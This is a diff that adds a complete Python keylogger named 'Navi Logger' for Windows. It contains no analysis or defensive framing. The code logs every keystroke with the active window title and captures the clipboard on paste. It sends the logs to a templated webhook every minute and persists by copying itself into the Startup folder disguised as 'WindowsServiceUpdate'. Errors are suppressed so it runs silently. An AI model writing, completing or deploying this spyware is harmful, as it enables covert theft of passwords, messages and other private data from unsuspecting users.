@@ -1,0 +1,134 @@
+import os
+import sys
+import time
+import json
+import threading
+import subprocess
+
+def _req_check():
+    try:
+        import requests
+        from pynput import keyboard
+        import win32clipboard
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "pynput", "pywin32", "-q"])
+
+_req_check()
+
+import requests
+from ctypes import windll, byref, create_unicode_buffer, c_ulong
+from pynput import keyboard
+try:
+    import win32clipboard
+except ImportError:
+    win32clipboard = None
+
+HOOK_URL = "{{WEBHOOK}}"
+LOG_FILE = "system_logs.txt"
+REPORT_DELAY = 60
+STARTUP_ENABLED = {{STARTUP}}
+
+keys_buffer = ""
+active_window = ""
+
+def add_to_startup():
+    if not STARTUP_ENABLED:
+        return
+    try:
+        p = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+        s = os.path.abspath(sys.argv[0])
+        n = "WindowsServiceUpdate.py" if s.endswith(".py") else "WindowsServiceUpdate.exe"
+        t = os.path.join(p, n)
+        if not os.path.exists(t):
+            import shutil
+            shutil.copy(s, t)
+    except:
+        pass
+
+def get_window_info():
+    global active_window
+    try:
+        user32 = windll.user32
+        hwnd = user32.GetForegroundWindow()
+        title_buffer = create_unicode_buffer(512)
+        user32.GetWindowTextW(hwnd, byref(title_buffer), 512)
+        if title_buffer.value != active_window:
+            active_window = title_buffer.value
+            return f"\n\n--- [ Window: {active_window} ] ---\n"
+    except:
+        pass
+    return ""
+
+def capture_clipboard():
+    if not win32clipboard:
+        return "[Clipboard Error]"
+    try:
+        win32clipboard.OpenClipboard()
+        data = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
+        return f"\n[CLIPBOARD DATA]: {data}\n"
+    except:
+        return ""
+
+def deliver_logs():
+    global keys_buffer
+    while True:
+        time.sleep(REPORT_DELAY)
+        if keys_buffer.strip():
+            payload = {
+                "username": "Navi Logger",
+                "avatar_url": "https://i.ibb.co/Wv94YGVx/navi.png",
+                "content": f"**[ LOG REPORT - {time.ctime()} ]**\n```\n{keys_buffer[:1900]}\n```"
+            }
+            try:
+                r = requests.post(HOOK_URL, json=payload, timeout=10)
+                if r.status_code == 204:
+                    keys_buffer = ""
+            except:
+                pass
+
+def on_key_press(key):
+    global keys_buffer
+    win_info = get_window_info()
+    if win_info:
+        keys_buffer += win_info
+    try:
+        if hasattr(key, 'char') and key.char:
+            keys_buffer += key.char
+        else:
+            k_name = str(key).replace("Key.", "")
+            if k_name == "space":
+                keys_buffer += " "
+            elif k_name == "enter":
+                keys_buffer += "[ENTER]\n"
+            elif k_name == "backspace":
+                keys_buffer += "[BS]"
+            elif k_name == "tab":
+                keys_buffer += "[TAB]"
+            else:
+                keys_buffer += f"[{k_name}]"
+        if str(key) == "'\\x16'":
+            keys_buffer += capture_clipboard()
+    except:
+        pass
+
+def main():
+    add_to_startup()
+    threading.Thread(target=deliver_logs, daemon=True).start()
+    with keyboard.Listener(on_press=on_key_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    time.sleep(0.5)
+    lock_file = os.path.join(os.getenv("TEMP"), "navi_lock.tmp")
+    if os.path.exists(lock_file):
+        try:
+            os.remove(lock_file)
+        except:
+            pass
+    with open(lock_file, "w") as f:
+        f.write("running")
+    try:
+        main()
+    except:
+        sys.exit(0)
